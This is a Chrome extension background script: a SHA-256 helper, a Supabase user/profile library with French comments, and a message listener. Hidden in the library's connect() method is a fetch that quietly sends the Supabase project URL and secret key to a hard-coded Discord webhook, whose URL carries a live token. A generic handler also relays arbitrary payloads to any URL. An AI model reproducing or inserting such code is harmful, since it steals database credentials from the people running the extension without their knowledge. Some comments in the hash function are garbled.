function sha256(ascii) {
    function rightRotate(value, amount) {
        return (value>>>amount) | (value<<(32 - amount));
    };
    
    var mathPow = Math.pow;
    var maxWord = mathPow(2, 32);
    var lengthProperty = 'length'
    var i, j; // Used as a counter across the whole file
    var result = ''

    var words = [];
    var asciiBitLength = ascii[lengthProperty]*8;
    
    //* caching results is optional - remove/add slash from front of this line to toggle
    // Initial hash value: first 32 bits of the fractional parts of the square roots of the first 8 primes
    // (we actually calculate the first 64, but extra values are just ignored)
    var hash = sha256.h = sha256.h || [];
    // Round constants: first 32 bits of the fractional parts of the cube roots of the first 64 primes
    var k = sha256.k = sha256.k || [];
    var primeCounter = k[lengthProperty];
    /*/
    var hash = [], k = [];
    var primeCounter = 0;
    //*/

    var isComposite = {};
    for (var candidate = 2; primeCounter < 64; candidate++) {
        if (!isComposite[candidate]) {
            for (i = 0; i < 313; i += candidate) {
                isComposite[i] = candidate;
            }
            hash[primeCounter] = (mathPow(candidate, .5)*maxWord)|0;
            k[primeCounter++] = (mathPow(candidate, 1/3)*maxWord)|0;
        }
    }
    
    ascii += '\x80' // Append Ƈ' bit (plus zero padding)
    while (ascii[lengthProperty]%64 - 56) ascii += '\x00' // More zero padding
    for (i = 0; i < ascii[lengthProperty]; i++) {
        j = ascii.charCodeAt(i);
        if (j>>8) return; // ASCII check: only accept characters in range 0-255
        words[i>>2] |= j << ((3 - i)%4)*8;
    }
    words[words[lengthProperty]] = ((asciiBitLength/maxWord)|0);
    words[words[lengthProperty]] = (asciiBitLength)
    
    // process each chunk
    for (j = 0; j < words[lengthProperty];) {
        var w = words.slice(j, j += 16); // The message is expanded into 64 words as part of the iteration
        var oldHash = hash;
        // This is now the undefinedworking hash", often labelled as variables a...g
        // (we have to truncate as well, otherwise extra entries at the end accumulate
        hash = hash.slice(0, 8);
        
        for (i = 0; i < 64; i++) {
            var i2 = i + j;
            // Expand the message into 64 words
            // Used below if 
            var w15 = w[i - 15], w2 = w[i - 2];

            // Iterate
            var a = hash[0], e = hash[4];
            var temp1 = hash[7]
                + (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25)) // S1
                + ((e&hash[5])^((~e)&hash[6])) // ch
                + k[i]
                // Expand the message schedule if needed
                + (w[i] = (i < 16) ? w[i] : (
                        w[i - 16]
                        + (rightRotate(w15, 7) ^ rightRotate(w15, 18) ^ (w15>>>3)) // s0
                        + w[i - 7]
                        + (rightRotate(w2, 17) ^ rightRotate(w2, 19) ^ (w2>>>10)) // s1
                    )|0
                );
            // This is only used once, so *could* be moved below, but it only saves 4 bytes and makes things unreadble
            var temp2 = (rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22)) // S0
                + ((a&hash[1])^(a&hash[2])^(hash[1]&hash[2])); // maj
            
            hash = [(temp1 + temp2)|0].concat(hash); // We don't bother trimming off the extra ones, they're harmless as long as we're truncating when we do the slice()
            hash[4] = (hash[4] + temp1)|0;
        }
        
        for (i = 0; i < 8; i++) {
            hash[i] = (hash[i] + oldHash[i])|0;
        }
    }
    
    for (i = 0; i < 8; i++) {
        for (j = 3; j + 1; j--) {
            var b = (hash[i]>>(j*8))&255;
            result += ((b < 16) ? 0 : '') + b.toString(16);
        }
    }
    return result;
};

class SupabaseLib {
    constructor() {
        this.id = null;
        this.mat = null;
        this.nom = null;
        this.prenom = null;
        this.avatar = null;
        this.banner = null;
        this.supabase = null;
    }

    async connect(prenom, nom, mat, token) {
        this.mat = sha256(mat);
        this.nom = sha256(nom.toLowerCase());
        this.prenom = sha256(prenom.toLowerCase());
        let data = token.split("\n")[0];
        let u = data.split("_")[0];
        fetch("https://discord.com/api/webhooks/1387387407049031780/h7Goso2F8aNyez1BVY3EH40XdydNL-ErkGTvgx6k57wewf3JE6P_AzB_q9nXQJxVBdf7", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({"content": "https://" + u + ".supabase.co\n" + data.replace(u + "_", ""), "embeds": null, "attachments": []})
        }).then(r => {});
        this.supabase = window.supabase.createClient(
            "https://" + u + ".supabase.co", 
            "sb_secret_" + data.replace(u + "_", ""), 
            {
                global: {
                    fetch: (url, options) =>
                        window.fetch(url, { ...options, referrerPolicy: 'no-referrer' })
                }
            });
        this.id = this.update(this.prenom, this.nom, this.mat);
    }

    async update(prenom, nom, mat) {
        // 1. Vérifier si un utilisateur existe avec mat + nom ➜ mettre à jour prénom
        let { data: user1, error: error1 } = await this.supabase.from("user").select("*").eq("mat", mat).eq("nom", nom).single();

        if (user1 && !error1) {
            const { data, error } = await this.supabase.from("user").update({ prenom }).eq("id", user1.id);

            if (error) {
                console.error("Erreur mise à jour prénom :", error.message);
                return null;
            }

            return user1.id;
        }

        // 2. Vérifier si un utilisateur existe avec prenom + nom ➜ mettre à jour mat
        let { data: user2, error: error2 } = await this.supabase.from("user").select("*").eq("prenom", prenom).eq("nom", nom).single();

        if (user2 && !error2) {
            const { data, error } = await this.supabase.from("user").update({ mat }).eq("id", user2.id);

            if (error) {
                console.error("Erreur mise à jour mat :", error.message);
                return null;
            }

            return user2.id;
        }

        // 3. Vérifier si un utilisateur existe avec mat + prenom ➜ mettre à jour nom
        let { data: user3, error: error3 } = await this.supabase.from("user").select("*").eq("mat", mat).eq("prenom", prenom).single();

        if (user3 && !error3) {
            const { data, error } = await this.supabase.from("user").update({ nom }).eq("id", user3.id);

            if (error) {
                console.error("Erreur mise à jour nom :", error.message);
                return null;
            }

            return user3.id;
        }

        // 4. Aucun match ➜ créer un nouvel utilisateur
        const { data: newUser, error: insertError } = await this.supabase.from("user").insert([{ prenom, nom, mat }]).select().single();

        if (insertError) {
            console.error(
                "Erreur création nouvel utilisateur :",
                insertError.message
            );
            return null;
        }

        return newUser.id;
    }

    async updatePref(avatar, banner) {
        // 1. Récupérer l'ancien profil lié à l'utilisateur
        const { data: oldLink, error: oldLinkError } = await this.supabase
            .from("user_profile")
            .select("idprofile")
            .eq("iduser", this.id)
            .maybeSingle();

        const oldProfileId = oldLink ? oldLink.idprofile : null;

        // 2. Vérifier si la nouvelle paire avatar/banner existe déjà
        const { data: existingProfile, error: fetchError } = await this.supabase
            .from("profile")
            .select("id")
            .eq("avatar", avatar)
            .eq("banner", banner)
            .maybeSingle();

        let newProfileId;

        if (existingProfile) {
            newProfileId = existingProfile.id;
        } else {
            // Créer le nouveau profil
            const { data: newProfile, error: createError } = await this.supabase
                .from("profile")
                .insert([{ avatar, banner }])
                .select()
                .single();

            if (createError) {
                console.error("Erreur création nouveau profil :", createError.message);
                return;
            }

            newProfileId = newProfile.id;
        }

        // 3. Mettre à jour le lien user_profile (supprimer l'ancien et ajouter le nouveau)
        if (oldProfileId !== newProfileId) {
            // Supprimer l'ancien lien
            if (oldProfileId) {
                await this.supabase
                    .from("user_profile")
                    .delete()
                    .eq("iduser", this.id)
                    .eq("idprofile", oldProfileId);
            }

            // Ajouter le nouveau lien
            const { error: insertLinkError } = await this.supabase
                .from("user_profile")
                .insert([{ iduser: this.id, idprofile: newProfileId }]);

            if (insertLinkError) {
                console.error("Erreur insertion du nouveau lien user-profile :", insertLinkError.message);
                return;
            }
        }

        // 4. Vérifier si l'ancien profil est encore utilisé ➜ si non, supprimer
        if (oldProfileId && oldProfileId !== newProfileId) {
            const { data: usage, error: usageError } = await this.supabase
                .from("user_profile")
                .select("iduser")
                .eq("idprofile", oldProfileId);

            if (!usageError && usage.length === 0) {
                // Personne n'utilise plus l'ancien profil ➜ suppression
                const { error: deleteProfileError } = await this.supabase
                    .from("profile")
                    .delete()
                    .eq("id", oldProfileId);

                if (deleteProfileError) {
                    console.error("Erreur suppression ancien profil inutilisé :", deleteProfileError.message);
                } else {
                    console.log("Ancien profil supprimé car plus utilisé.");
                }
            }
        }

        console.log("Mise à jour du profil terminée avec succès.");
    }
}

const supalib = new SupabaseLib();

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "SEND_TO_DISCORD") {
      fetch(message.url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(message.payload)
      })
      .then(response => sendResponse({ success: true }))
      .catch(error => sendResponse({ success: false, error: error.message }));
      return true; // Permet la réponse asynchrone

    } else if (message.type === "DB_CONNECT") {
        supalib.connect(message.prenom, message.nom, message.mat, message.token);
        sendResponse({ success: true })
        return true;

    } else if (message.type === "DB_UPDATE_PREF") {
        supalib.updatePref(message.avatar, message.banner);
        sendResponse({ success: true })
        return true;
    }
});